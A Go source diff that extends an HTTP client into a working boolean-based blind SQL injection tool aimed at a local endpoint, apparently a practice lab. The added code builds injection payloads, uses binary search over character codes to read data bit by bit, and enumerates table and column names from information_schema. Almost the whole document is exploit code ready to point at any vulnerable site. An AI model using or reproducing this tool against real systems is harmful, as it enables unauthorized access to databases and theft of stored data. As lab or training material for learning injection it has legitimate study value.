@@ -47,10 +47,6 @@ func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
 	}, nil
 }
 
-func bodyContainsOracle(obs Observation) bool {
-	return strings.Contains(obs.Body, "Product found")
-}
-
 func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 	data := url.Values{}
 	data.Set("id", payload)
@@ -83,6 +79,90 @@ func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 	}, nil
 }
 
+func buildConditionPayload(condition string) string {
+	return fmt.Sprintf("1' AND %s-- -", condition)
+}
+
+func buildCountGreaterCondition(countExpr string, value int) string {
+	return fmt.Sprintf(
+		"(%s)>%d",
+		countExpr,
+		value,
+	)
+}
+
+func buildCharGreaterCondition(sqlExpr string, position int, code int) string {
+	return fmt.Sprintf(
+		"ASCII(SUBSTRING((%s),%d,1))>%d",
+		sqlExpr,
+		position,
+		code,
+	)
+}
+
+func (c *HTTPClient) IsTrue(condition string) (bool, error) {
+	payload := buildConditionPayload(condition)
+
+	obs, err := c.SendPayload(payload)
+	if err != nil {
+		return false, fmt.Errorf("send condition payload: %w", err)
+	}
+
+	return strings.Contains(obs.Body, "Product found"), nil
+}
+
+func (c *HTTPClient) ExtractInt(sqlQuery string, maxLen int) (int, error) {
+	low := 0
+	high := maxLen
+
+	for low < high {
+		mid := (low + high) / 2
+		payload := buildCountGreaterCondition(sqlQuery, mid)
+
+		ok, err := c.IsTrue(payload)
+		if err != nil {
+			return 0, err
+		}
+
+		if ok {
+			low = mid + 1
+		} else {
+			high = mid
+		}
+	}
+
+	return low, nil
+}
+
+func (c *HTTPClient) ExtractString(sqlQuery string, maxLen int) (string, error) {
+	var result strings.Builder
+
+	for i := 1; i <= maxLen; i++ {
+		low := ASCIIMin
+		high := ASCIIMax
+
+		for low < high {
+			mid := (low + high) / 2
+
+			payload := buildCharGreaterCondition(sqlQuery, i, mid)
+
+			ok, err := c.IsTrue(payload)
+			if err != nil {
+				return "", err
+			}
+
+			if ok {
+				low = mid + 1
+			} else {
+				high = mid
+			}
+		}
+		result.WriteRune(rune(low))
+	}
+
+	return result.String(), nil
+}
+
 func main() {
 	baseURL := "http://127.0.0.1:5007/boolean"
 	client, err := NewHTTPClient(baseURL, 5*time.Second)
@@ -91,19 +171,79 @@ func main() {
 		os.Exit(1)
 	}
 
-	obs, err := client.SendPayload(" ' or 1=1-- -")
+	tableCountExpr := "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()"
+	tableCountRes, err := client.ExtractInt(tableCountExpr, 32)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
+	fmt.Println("Table count:", tableCountRes)
 
-	fmt.Println("Contains oracle:", bodyContainsOracle(obs))
+	tableNames := make([]string, 0)
+	for i := 0; i < tableCountRes; i++ {
+		sqlQuery := fmt.Sprintf(
+			"SELECT CHAR_LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT 1 OFFSET %d",
+			i,
+		)
+		lengthTablename, err := client.ExtractInt(sqlQuery, 64)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(1)
+		}
+		fmt.Println("Length of table name:", lengthTablename)
 
-	obs, err = client.SendPayload(" ' or 1=2-- -")
-	if err != nil {
-		fmt.Fprintln(os.Stderr, err)
-		os.Exit(1)
+		sqlQuery = fmt.Sprintf(
+			"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT 1 OFFSET %d",
+			i,
+		)
+		tableName, err := client.ExtractString(sqlQuery, lengthTablename)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(1)
+		}
+		fmt.Println("Table name:", tableName)
+		tableNames = append(tableNames, tableName)
+		fmt.Println()
 	}
 
-	fmt.Println("Contains oracle:", bodyContainsOracle(obs))
+	columnNames := make([]string, 0)
+	for _, tableName := range tableNames {
+		fmt.Println()
+		fmt.Println("TABLE NAME:", tableName)
+		sqlQuery := fmt.Sprintf(
+			"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s'",
+			tableName,
+		)
+		columnCount, err := client.ExtractInt(sqlQuery, 32)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(1)
+		}
+
+		fmt.Println("Columns count:", columnCount)
+		for i := 0; i < columnCount; i++ {
+			sqlQuery = fmt.Sprintf(
+				"SELECT CHAR_LENGTH(column_name) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
+				tableName,
+				i,
+			)
+			lengthColumnName, err := client.ExtractInt(sqlQuery, 64)
+			if err != nil {
+				fmt.Fprintln(os.Stderr, err)
+				os.Exit(1)
+			}
+			sqlQuery = fmt.Sprintf(
+				"SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
+				tableName,
+				i,
+			)
+			columnName, err := client.ExtractString(sqlQuery, lengthColumnName)
+			if err != nil {
+				fmt.Fprintln(os.Stderr, err)
+				os.Exit(1)
+			}
+			fmt.Println("Column name:", columnName)
+			columnNames = append(columnNames, columnName)
+		}
+	}
 }
